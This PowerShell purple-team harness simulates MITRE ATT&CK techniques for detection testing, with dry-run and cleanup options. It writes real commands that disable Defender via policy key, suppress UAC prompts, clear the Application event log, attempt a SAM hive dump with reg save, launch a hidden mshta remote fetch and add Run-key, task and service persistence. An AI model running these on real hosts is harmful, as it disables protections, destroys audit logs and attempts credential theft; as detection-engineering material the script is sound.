#Requires -Version 5.1
<#
.SYNOPSIS
    SIGIL MITRE Simulation Framework v2 - Enhanced Purple Team Harness

.DESCRIPTION
    Simulates adversary techniques mapped to MITRE ATT&CK for detection
    engineering and purple team exercises. All techniques are lab-safe and
    include full cleanup. Requires a controlled test environment.

    !! DO NOT RUN ON PRODUCTION SYSTEMS !!

.PARAMETER All
    Run all available simulations.

.PARAMETER RunKey
    T1547.001 - Boot/Logon Autostart: Registry Run Keys

.PARAMETER UACBypass
    T1548.002 - Abuse Elevation Control Mechanism: Bypass UAC

.PARAMETER DisableDefender
    T1562.001 - Impair Defenses: Disable or Modify Tools

.PARAMETER ScheduledTask
    T1053.005 - Scheduled Task/Job: Scheduled Task

.PARAMETER LSASS
    T1003.001 - OS Credential Dumping: LSASS Memory (process list only)

.PARAMETER MSHTA
    T1218.005 - System Binary Proxy Execution: Mshta

.PARAMETER ServiceBackdoor
    T1543.003 - Create or Modify System Process: Windows Service

.PARAMETER RegSAM
    T1003.002 - OS Credential Dumping: Security Account Manager

.PARAMETER EventLogClear
    T1070.001 - Indicator Removal: Clear Windows Event Logs

.PARAMETER Certutil
    T1140 - Deobfuscate/Decode Files or Information via certutil

.PARAMETER Cleanup
    Remove all artifacts created by prior simulation runs.

.PARAMETER DryRun
    Preview what each selected technique would do without executing it.

.PARAMETER LogPath
    Optional path to write a timestamped simulation log file.

.EXAMPLE
    .\SIGIL_Mitre_v2.ps1 -All
    .\SIGIL_Mitre_v2.ps1 -RunKey -ScheduledTask -Cleanup
    .\SIGIL_Mitre_v2.ps1 -All -DryRun
    .\SIGIL_Mitre_v2.ps1 -All -LogPath "C:\Logs\sigil_run.txt"
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [switch]$All,
    [switch]$RunKey,
    [switch]$UACBypass,
    [switch]$DisableDefender,
    [switch]$ScheduledTask,
    [switch]$LSASS,
    [switch]$MSHTA,
    [switch]$ServiceBackdoor,
    [switch]$RegSAM,
    [switch]$EventLogClear,
    [switch]$Certutil,
    [switch]$Cleanup,
    [switch]$DryRun,
    [string]$LogPath = ""
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "SilentlyContinue"

# ─────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────
$SIGIL_TAG        = "SIGIL_SIM"
$RUN_KEY_NAME     = "${SIGIL_TAG}_RunKey"
$TASK_NAME        = "${SIGIL_TAG}_Task"
$SERVICE_KEY      = "HKLM:\SYSTEM\CurrentControlSet\Services\${SIGIL_TAG}_FakeSvc"
$UAC_KEY          = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$DEFENDER_KEY     = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$TEMP_DIR         = Join-Path $env:TEMP $SIGIL_TAG
$CERTUTIL_INFILE  = Join-Path $TEMP_DIR "encoded_payload.txt"
$CERTUTIL_OUTFILE = Join-Path $TEMP_DIR "decoded_payload.bin"

# ─────────────────────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────────────────────
function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO","WARN","PASS","FAIL","DRY","CLEAN")]
        [string]$Level = "INFO"
    )
    $ts     = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $prefix = switch ($Level) {
        "PASS"  { "[+]" }
        "FAIL"  { "[X]" }
        "WARN"  { "[!]" }
        "DRY"   { "[~]" }
        "CLEAN" { "[C]" }
        default { "[*]" }
    }
    $line = "[$ts] $prefix $Message"
    Write-Host $line
    if ($LogPath) { $line | Out-File -FilePath $LogPath -Append -Encoding UTF8 }
}

# ─────────────────────────────────────────────────────────────
# SAFETY CHECKS
# ─────────────────────────────────────────────────────────────
function Assert-LabEnvironment {
    # Refuse to run if a domain is joined (basic prod guardrail)
    $domain = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
    if ($domain -eq $true) {
        Write-Log "SAFETY ABORT: Host is domain-joined. SIGIL should only run on isolated lab machines." WARN
        Write-Log "Set `$env:SIGIL_FORCE_RUN = '1' to override (not recommended)." WARN
        if ($env:SIGIL_FORCE_RUN -ne '1') { exit 1 }
    }

    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    Write-Log "Target OS: $os" INFO

    # Warn loudly on DisableDefender -- it writes a real policy key
    if ($DisableDefender -or $All) {
        Write-Log "WARNING: DisableDefender writes to a real Defender policy registry key." WARN
        Write-Log "         It will suppress Defender on this host until cleaned up." WARN
    }
}

function Ensure-TempDir {
    if (-not (Test-Path $TEMP_DIR)) {
        New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null
        Write-Log "Created working directory: $TEMP_DIR" INFO
    }
}

# ─────────────────────────────────────────────────────────────
# SIMULATION FUNCTIONS
# ─────────────────────────────────────────────────────────────

function Invoke-RunKey {
    # T1547.001 - Persistence via HKCU Run key
    if ($DryRun) {
        Write-Log "DRY RUN - Would write Run key: HKCU:\...\Run\$RUN_KEY_NAME -> notepad.exe" DRY
        return
    }
    try {
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
            -Name $RUN_KEY_NAME -Value "C:\Windows\System32\notepad.exe" `
            -PropertyType String -Force | Out-Null
        Write-Log "T1547.001 [Run Key] Written to: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$RUN_KEY_NAME -> C:\Windows\System32\notepad.exe" PASS
    } catch {
        Write-Log "T1547.001 [Run Key] Failed: $_" FAIL
    }
}

function Remove-RunKey {
    try {
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
            -Name $RUN_KEY_NAME -Force -ErrorAction Stop
        Write-Log "T1547.001 [Run Key] Cleaned up: $RUN_KEY_NAME" CLEAN
    } catch {
        Write-Log "T1547.001 [Run Key] Nothing to clean (key not found)." INFO
    }
}

function Invoke-UACBypass {
    # T1548.002 - UAC bypass via ConsentPromptBehaviorAdmin = 0
    if ($DryRun) {
        Write-Log "DRY RUN - Would set ConsentPromptBehaviorAdmin=0 in HKLM Policies\System" DRY
        return
    }
    try {
        New-ItemProperty -Path $UAC_KEY `
            -Name "ConsentPromptBehaviorAdmin" -Value 0 `
            -PropertyType DWord -Force | Out-Null
        Write-Log "T1548.002 [UAC Bypass] Written to: $UAC_KEY\ConsentPromptBehaviorAdmin = 0" PASS
    } catch {
        Write-Log "T1548.002 [UAC Bypass] Failed (may need elevation): $_" FAIL
    }
}

function Remove-UACBypass {
    try {
        # Restore default value (5 = prompt with dimmed desktop for admins)
        Set-ItemProperty -Path $UAC_KEY -Name "ConsentPromptBehaviorAdmin" -Value 5 -Force
        Write-Log "T1548.002 [UAC Bypass] Restored ConsentPromptBehaviorAdmin to 5." CLEAN
    } catch {
        Write-Log "T1548.002 [UAC Bypass] Could not restore UAC value: $_" FAIL
    }
}

function Invoke-DisableDefender {
    # T1562.001 - Disable AV via registry policy key
    Write-Log "WARNING: This writes a real Defender disable policy key." WARN
    if ($DryRun) {
        Write-Log "DRY RUN - Would set DisableAntiSpyware=1 at $DEFENDER_KEY" DRY
        return
    }
    try {
        if (-not (Test-Path $DEFENDER_KEY)) {
            New-Item -Path $DEFENDER_KEY -Force | Out-Null
        }
        New-ItemProperty -Path $DEFENDER_KEY `
            -Name "DisableAntiSpyware" -Value 1 `
            -PropertyType DWord -Force | Out-Null
        Write-Log "T1562.001 [Disable Defender] Written to: $DEFENDER_KEY\DisableAntiSpyware = 1. Run cleanup immediately after testing." PASS
    } catch {
        Write-Log "T1562.001 [Disable Defender] Failed (requires elevation): $_" FAIL
    }
}

function Remove-DisableDefender {
    try {
        Remove-ItemProperty -Path $DEFENDER_KEY -Name "DisableAntiSpyware" -Force -ErrorAction Stop
        Write-Log "T1562.001 [Disable Defender] Policy key removed." CLEAN
    } catch {
        Write-Log "T1562.001 [Disable Defender] Nothing to clean." INFO
    }
}

function Invoke-ScheduledTask {
    # T1053.005 - Persistence via scheduled task
    if ($DryRun) {
        Write-Log "DRY RUN - Would create scheduled task '$TASK_NAME' (trigger: OnLogon, action: notepad.exe)" DRY
        return
    }
    try {
        $action  = New-ScheduledTaskAction -Execute "notepad.exe"
        $trigger = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -TaskName $TASK_NAME `
            -Action $action -Trigger $trigger -Force | Out-Null
        Write-Log "T1053.005 [Scheduled Task] Written to: Task Scheduler -> \$TASK_NAME (trigger: OnLogon, action: notepad.exe)" PASS
    } catch {
        Write-Log "T1053.005 [Scheduled Task] Failed: $_" FAIL
    }
}

function Remove-ScheduledTask {
    try {
        Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction Stop
        Write-Log "T1053.005 [Scheduled Task] Task '$TASK_NAME' removed." CLEAN
    } catch {
        Write-Log "T1053.005 [Scheduled Task] Nothing to clean." INFO
    }
}

function Invoke-LSASSAccess {
    # T1003.001 - Simulate LSASS access (process listing only -- no memory reads)
    if ($DryRun) {
        Write-Log "DRY RUN - Would query tasklist for lsass.exe PID (no memory read)." DRY
        return
    }
    try {
        $proc = Get-Process -Name lsass -ErrorAction Stop
        Write-Log "T1003.001 [LSASS Access] Simulated access -- lsass.exe found at PID $($proc.Id) under C:\Windows\System32\lsass.exe (no memory read performed)." PASS
    } catch {
        Write-Log "T1003.001 [LSASS Access] lsass.exe not found or access denied." FAIL
    }
}

function Invoke-MSHTA {
    # T1218.005 - LOLBin execution via mshta.exe
    # NOTE: This makes a real DNS + HTTP request to example.com -- intentional for DNS telemetry testing.
    Write-Log "NOTE: mshta.exe will generate a real DNS query and HTTP request to example.com for telemetry testing." WARN
    if ($DryRun) {
        Write-Log "DRY RUN - Would execute: mshta.exe http://example.com/sigil_test.hta" DRY
        return
    }
    try {
        Start-Process -FilePath "mshta.exe" `
            -ArgumentList "http://example.com/sigil_test.hta" `
            -WindowStyle Hidden
        Write-Log "T1218.005 [MSHTA LOLBin] Executed: C:\Windows\System32\mshta.exe http://example.com/sigil_test.hta (WindowStyle: Hidden)" PASS
    } catch {
        Write-Log "T1218.005 [MSHTA LOLBin] Failed: $_" FAIL
    }
}

function Invoke-ServiceBackdoor {
    # T1543.003 - Fake service registry entry
    if ($DryRun) {
        Write-Log "DRY RUN - Would create service registry key: $SERVICE_KEY" DRY
        return
    }
    try {
        New-Item -Path $SERVICE_KEY -Force | Out-Null
        Set-ItemProperty -Path $SERVICE_KEY -Name "ImagePath"    -Value "C:\Windows\System32\notepad.exe" -Force
        Set-ItemProperty -Path $SERVICE_KEY -Name "Type"         -Value 16 -Force
        Set-ItemProperty -Path $SERVICE_KEY -Name "Start"        -Value 2  -Force
        Set-ItemProperty -Path $SERVICE_KEY -Name "Description"  -Value "SIGIL Test Service - safe to delete" -Force
        Write-Log "T1543.003 [Service Backdoor] Written to: $SERVICE_KEY" PASS
        Write-Log "  ImagePath -> C:\Windows\System32\notepad.exe | Start: 2 (Auto) | Type: 16 (Own Process)" INFO
    } catch {
        Write-Log "T1543.003 [Service Backdoor] Failed (requires elevation): $_" FAIL
    }
}

function Remove-ServiceBackdoor {
    try {
        Remove-Item -Path $SERVICE_KEY -Recurse -Force -ErrorAction Stop
        Write-Log "T1543.003 [Service Backdoor] Registry key removed." CLEAN
    } catch {
        Write-Log "T1543.003 [Service Backdoor] Nothing to clean." INFO
    }
}

function Invoke-RegSAM {
    # T1003.002 - SAM access via reg.exe (attempt only; will fail without SYSTEM, which is the expected detection signal)
    if ($DryRun) {
        Write-Log "DRY RUN - Would attempt: reg save HKLM\SAM $TEMP_DIR\sam.hive" DRY
        return
    }
    Ensure-TempDir
    try {
        $out = & reg save "HKLM\SAM" "$TEMP_DIR\sam.hive" /y 2>&1
        Write-Log "T1003.002 [SAM Dump Attempt] reg.exe invoked: reg save HKLM\SAM $TEMP_DIR\sam.hive -- output: $out" PASS
    } catch {
        Write-Log "T1003.002 [SAM Dump Attempt] reg.exe attempted HKLM\SAM -> $TEMP_DIR\sam.hive -- access denied (expected; detection signal generated)." PASS
    }
}

function Remove-RegSAM {
    $hive = "$TEMP_DIR\sam.hive"
    if (Test-Path $hive) {
        Remove-Item $hive -Force
        Write-Log "T1003.002 [SAM Dump] Removed $hive" CLEAN
    } else {
        Write-Log "T1003.002 [SAM Dump] Nothing to clean." INFO
    }
}

function Invoke-EventLogClear {
    # T1070.001 - Clear-EventLog simulation (writes to Application log first so the clear is detectable)
    Write-Log "WARNING: This will clear the Application event log on this host." WARN
    if ($DryRun) {
        Write-Log "DRY RUN - Would write a marker event then clear the Application event log." DRY
        return
    }
    try {
        # Write a marker first so there is something to detect before the clear
        Write-EventLog -LogName Application -Source "Application" `
            -EntryType Information -EventId 9999 `
            -Message "SIGIL SIMULATION MARKER - T1070.001 EventLog clear test" -ErrorAction Stop
        Write-Log "T1070.001 [EventLog Clear] Marker event written to: Windows Event Log -> Application (Source: Application, EventID: 9999)" PASS

        Clear-EventLog -LogName "Application"
        Write-Log "T1070.001 [EventLog Clear] Application log cleared via Clear-EventLog. Check Security log EventID 1102 for wipe telemetry." PASS
    } catch {
        Write-Log "T1070.001 [EventLog Clear] Failed (may need elevation): $_" FAIL
    }
}

function Invoke-Certutil {
    # T1140 - Deobfuscate/Decode via certutil -decode (LOLBin abuse)
    if ($DryRun) {
        Write-Log "DRY RUN - Would create a base64-encoded file and decode it with certutil.exe." DRY
        return
    }
    Ensure-TempDir
    try {
        # Encode a harmless string and decode it via certutil
        $plaintext = "SIGIL_SIMULATION_CERTUTIL_T1140"
        $bytes      = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
        $b64        = [Convert]::ToBase64String($bytes)
        Set-Content -Path $CERTUTIL_INFILE -Value $b64 -Encoding ASCII

        $result = & certutil -decode $CERTUTIL_INFILE $CERTUTIL_OUTFILE 2>&1
        Write-Log "T1140 [Certutil Decode] Input:  $CERTUTIL_INFILE" PASS
        Write-Log "T1140 [Certutil Decode] Output: $CERTUTIL_OUTFILE (decoded via certutil.exe). Verify EDR/AV telemetry." PASS
    } catch {
        Write-Log "T1140 [Certutil Decode] Failed: $_" FAIL
    }
}

function Remove-Certutil {
    foreach ($f in @($CERTUTIL_INFILE, $CERTUTIL_OUTFILE)) {
        if (Test-Path $f) {
            Remove-Item $f -Force
            Write-Log "T1140 [Certutil] Removed: $f" CLEAN
        }
    }
}

# ─────────────────────────────────────────────────────────────
# CLEANUP ORCHESTRATOR
# ─────────────────────────────────────────────────────────────
function Invoke-FullCleanup {
    Write-Log "===== SIGIL CLEANUP PASS =====" INFO
    Remove-RunKey
    Remove-UACBypass
    Remove-DisableDefender
    Remove-ScheduledTask
    Remove-ServiceBackdoor
    Remove-RegSAM
    Remove-Certutil

    # Remove temp working directory
    if (Test-Path $TEMP_DIR) {
        Remove-Item -Path $TEMP_DIR -Recurse -Force
        Write-Log "Working directory removed: $TEMP_DIR" CLEAN
    }
    Write-Log "===== CLEANUP COMPLETE =====" INFO
}

# ─────────────────────────────────────────────────────────────
# MAIN ENTRY POINT
# ─────────────────────────────────────────────────────────────
Write-Log "======================================================" INFO
Write-Log "  SIGIL MITRE Simulation Framework v2" INFO
Write-Log "  !! FOR ISOLATED LAB USE ONLY !!" WARN
Write-Log "======================================================" INFO

if ($DryRun) {
    Write-Log "DRY RUN MODE - No changes will be made to this system." DRY
}

if ($Cleanup -and -not $All -and -not $RunKey -and -not $UACBypass -and
    -not $DisableDefender -and -not $ScheduledTask -and -not $LSASS -and
    -not $MSHTA -and -not $ServiceBackdoor -and -not $RegSAM -and
    -not $EventLogClear -and -not $Certutil) {
    # Bare -Cleanup with no technique flags = full cleanup
    Invoke-FullCleanup
    exit 0
}

Assert-LabEnvironment
Ensure-TempDir

# ── SIMULATE ─────────────────────────────────────────────────
if ($All -or $RunKey)          { Invoke-RunKey          }
if ($All -or $UACBypass)       { Invoke-UACBypass       }
if ($All -or $DisableDefender) { Invoke-DisableDefender }
if ($All -or $ScheduledTask)   { Invoke-ScheduledTask   }
if ($All -or $LSASS)           { Invoke-LSASSAccess     }
if ($All -or $MSHTA)           { Invoke-MSHTA           }
if ($All -or $ServiceBackdoor) { Invoke-ServiceBackdoor }
if ($All -or $RegSAM)          { Invoke-RegSAM          }
if ($All -or $EventLogClear)   { Invoke-EventLogClear   }
if ($All -or $Certutil)        { Invoke-Certutil        }

# ── SELECTIVE CLEANUP (when -Cleanup is paired with technique flags) ──
if ($Cleanup) {
    Write-Log "===== SELECTIVE CLEANUP =====" INFO
    if ($All -or $RunKey)          { Remove-RunKey          }
    if ($All -or $UACBypass)       { Remove-UACBypass       }
    if ($All -or $DisableDefender) { Remove-DisableDefender }
    if ($All -or $ScheduledTask)   { Remove-ScheduledTask   }
    if ($All -or $ServiceBackdoor) { Remove-ServiceBackdoor }
    if ($All -or $RegSAM)          { Remove-RegSAM          }
    if ($All -or $Certutil)        { Remove-Certutil        }
    Write-Log "===== SELECTIVE CLEANUP COMPLETE =====" INFO
}

Write-Log "===== SIMULATION COMPLETE =====" INFO
Write-Log "Validate XQL/KQL hits, EDR alerts, and event log entries now." INFO
if (-not $Cleanup -and -not $DryRun) {
    Write-Log "Reminder: Run with -Cleanup flag to remove all artifacts when done." WARN
}
